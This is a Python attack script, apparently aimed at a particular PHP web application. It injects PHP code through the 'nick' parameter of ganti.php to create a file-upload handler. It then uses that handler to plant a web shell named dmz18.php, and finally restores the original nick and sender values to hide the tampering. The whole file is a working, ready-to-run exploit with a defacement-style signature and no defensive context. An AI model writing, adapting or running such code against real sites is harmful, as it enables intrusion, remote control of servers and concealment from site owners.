import requests
import time
from bs4 import BeautifulSoup
def upload(url):
    isi_web = requests.get(url)
    soup = BeautifulSoup(isi_web.text, 'html.parser')
    nick = soup.find('input', id='valNick')
    sender = soup.find('input', id='valSender')
    nick_value = nick['value']
    sender_value = sender['value']
    print(f"\nNICK   : {nick_value}")
    print(f"SENDER : {sender_value}")


    link_ganti = url + "ganti.php"
    link_data = url + "data.php"
    print("\nUploading Payload -----------")
    payload = '"; ?> <form action="data.php" method="post" enctype="multipart/form-data">   Select image to upload:   <input type="file" name="file" id="file">   <input type="submit" value="Upload Image" name="submit"> </form> <?php $target_dir = ""; $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]); $uploadOk = 1; $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION)); if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) { echo "The file " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " has been uploaded."; } else { echo "Sorry, there was an error uploading your file."; } echo "\nDMZ WAS HERE'
    ganti_params = {'nick':payload}
    ganti = requests.get(link_ganti,ganti_params)

    if (ganti.text == "200"):
        time.sleep(4)
        print("\nUploading Shell -----------")
        files = {'fileToUpload': open('dmz18.php', 'rb')}
        upload_shell = requests.post(link_data, files=files)
        if (upload_shell.status_code == 200):
                print("\nUploading Real Nick & Sender -----------")
                ganti_params1 = {'nick':nick_value,'sender':sender_value}
                ganti1 = requests.get(link_ganti,ganti_params1)
                if (ganti1.text == "200"):
                     print("\nDONEEEEEE")
                     print(f"{url}dmz18.php")
                else :
                     print("gagal3")
        else:
            print("gagal2")
    else: 
        print("gagal1")
url = input("Input link : ")
upload(url)